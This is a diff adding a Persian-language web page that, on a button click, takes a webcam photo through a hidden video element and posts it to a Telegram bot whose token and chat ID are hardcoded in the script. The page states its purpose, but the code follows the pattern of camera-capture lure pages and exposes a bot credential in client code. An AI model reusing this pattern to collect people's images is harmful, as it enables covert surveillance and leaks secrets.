@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>ارسال عکس به تلگرام</title>
+</head>
+<body style="text-align:center; font-family:tahoma;">
+  <h2>📸 گرفتن عکس و ارسال به تلگرام</h2>
+  <button onclick="takePhotoAndSend()">شروع ارسال عکس</button>
+
+  <script>
+    async function takePhotoAndSend() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const video = document.createElement('video');
+        video.style.display = 'none';
+        document.body.appendChild(video);
+        video.srcObject = stream;
+
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            video.play();
+            resolve();
+          };
+        });
+
+        await new Promise(r => setTimeout(r, 800));
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+        canvas.toBlob(blob => {
+          if (blob) sendPhotoToTelegram(blob);
+          else alert('خطا: عکس گرفته نشد.');
+          stream.getTracks().forEach(t => t.stop());
+        }, 'image/jpeg');
+      } catch (err) {
+        alert('دوربین پیدا نشد یا اجازه داده نشد.\n' + err.message);
+      }
+    }
+
+    function sendPhotoToTelegram(blob) {
+      const token = '7731026303:AAHM_IKBur7e5E9gTKl3T7s5XQ1GEYdZ7wU';
+      const chat_id = '7103005496';
+      const url = `https://api.telegram.org/bot${token}/sendPhoto`;
+      const formData = new FormData();
+      formData.append('photo', blob, 'photo.jpg');
+      formData.append('chat_id', chat_id);
+
+      fetch(url, { method: 'POST', body: formData })
+        .then(res => res.json())
+        .then(data => {
+          if (data.ok) alert('عکس ارسال شد! ✅');
+          else alert('خطا در ارسال عکس:\n' + data.description);
+        })
+        .catch(err => alert('خطا در ارتباط:\n' + err.message));
+    }
+  </script>
+</body>
+</html>
